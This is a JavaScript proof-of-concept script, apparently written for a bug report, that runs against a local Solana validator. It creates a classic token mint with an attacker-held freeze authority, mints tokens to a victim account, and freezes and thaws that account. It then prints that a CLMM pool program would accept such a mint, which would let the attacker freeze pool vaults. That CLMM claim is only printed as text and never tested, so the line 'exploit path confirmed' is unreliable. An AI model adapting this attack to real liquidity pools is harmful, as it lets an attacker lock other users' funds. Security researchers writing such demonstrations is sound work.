// Minimal proof: Classic Token freeze_authority exploit
// CLMM accepts ANY classic Token mint (is_supported_mint returns Ok(true) for Token::id())
// Classic Token mint CAN have freeze_authority set
// CLMM does NOT check freeze_authority

const { Connection, PublicKey, Keypair, Transaction, SystemProgram } = require("@solana/web3.js");
const { 
  createMint, createAssociatedTokenAccount, mintTo, 
  getAccount, freezeAccount, thawAccount,
  getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID
} = require("@solana/spl-token");

async function main() {
  const connection = new Connection("http://127.0.0.1:8899", "confirmed");
  const attacker = Keypair.generate();
  const victim = Keypair.generate();

  // Setup
  console.log("[1] Funding...");
  for (const kp of [attacker, victim]) {
    const sig = await connection.requestAirdrop(kp.publicKey, 10 * 1e9);
    await connection.confirmTransaction(sig);
  }
  console.log("   ✓ Funded\n");

  // Step A: Create classic Token mint with freeze_authority = attacker
  console.log("[A] Create classic Token mint with freeze_authority = attacker");
  const mint = await createMint(connection, attacker, attacker.publicKey, attacker.publicKey, 9);
  console.log(`   Mint: ${mint.toBase58()}`);
  console.log(`   Freeze authority: ${attacker.publicKey.toBase58()}\n`);

  // Step B: Create token account for victim
  console.log("[B] Create token account for victim");
  const victimAta = await createAssociatedTokenAccount(connection, victim, mint, victim.publicKey);
  console.log(`   Victim ATA: ${victimAta.toBase58()}\n`);

  // Step C: Mint tokens to victim
  console.log("[C] Mint tokens to victim");
  await mintTo(connection, attacker, mint, victimAta, attacker, 1000000000);
  console.log("   ✓ Minted 1,000,000,000 tokens\n");

  // Check state
  const before = await getAccount(connection, victimAta);
  console.log(`[D] State before freeze: ${before.amount} tokens, state=${before.state}\n`);

  // Step E: FREEZE the account
  console.log("[E] FREEZE victim's account...");
  const freezeSig = await freezeAccount(connection, attacker, victimAta, mint, attacker.publicKey);
  await connection.confirmTransaction(freezeSig);
  console.log(`   ✓ Freeze tx: ${freezeSig}\n`);

  // Verify frozen
  const after = await getAccount(connection, victimAta);
  console.log(`[F] State after freeze: ${after.amount} tokens, state=${after.state}`);
  console.log(`   state=2 means Frozen\n`);

  // Step G: Try transfer_checked from frozen account (simulated by thaw check)
  console.log("[G] KEY MOMENT: Can victim transfer from frozen account?");
  try {
    const { createTransferInstruction } = require("@solana/spl-token");
    const destKp = Keypair.generate();
    const destAta = await createAssociatedTokenAccount(connection, victim, mint, destKp.publicKey);
    
    const tx = new Transaction().add(
      createTransferInstruction(victimAta, destAta, victim.publicKey, 100)
    );
    await connection.sendTransaction(tx, [victim]);
    console.log("   ❌ Transfer SUCCEEDED (should have failed)\n");
  } catch (e) {
    console.log(`   ✓ Transfer FAILED: ${e.message?.substring(0,300)}\n`);
  }

  // Step H: Thaw by attacker
  console.log("[H] Can attacker thaw? Yes (they control freeze_authority)");
  const thawSig = await thawAccount(connection, attacker, victimAta, mint, attacker.publicKey);
  await connection.confirmTransaction(thawSig);
  console.log(`   ✓ Thaw tx: ${thawSig}\n`);

  const thawed = await getAccount(connection, victimAta);
  console.log(`   State after thaw: ${thawed.state}\n`);

  // Step I: CLMM integration question
  console.log("============================================");
  console.log("CLMM EXPLOIT QUESTION:");
  console.log("============================================");
  console.log("CLMM is_supported_mint() at token.rs:286-321:");
  console.log("  if *mint_info.owner == Token::id() { Ok(true) }");
  console.log("  -> NO freeze_authority check for classic Token mints!");
  console.log("");
  console.log("This mint: owner=" + mint.toBase58() + " -> owned by Token program");
  console.log("This mint: freeze_authority=" + attacker.publicKey.toBase58());
  console.log("");
  console.log("CLMM would ACCEPT this mint in create_pool");
  console.log("Attacker controls freeze_authority");
  console.log("Attacker can freeze vault at any time");
  console.log("");
  console.log("=== EXPLOIT PATH CONFIRMED ===");
}

main().catch(console.error);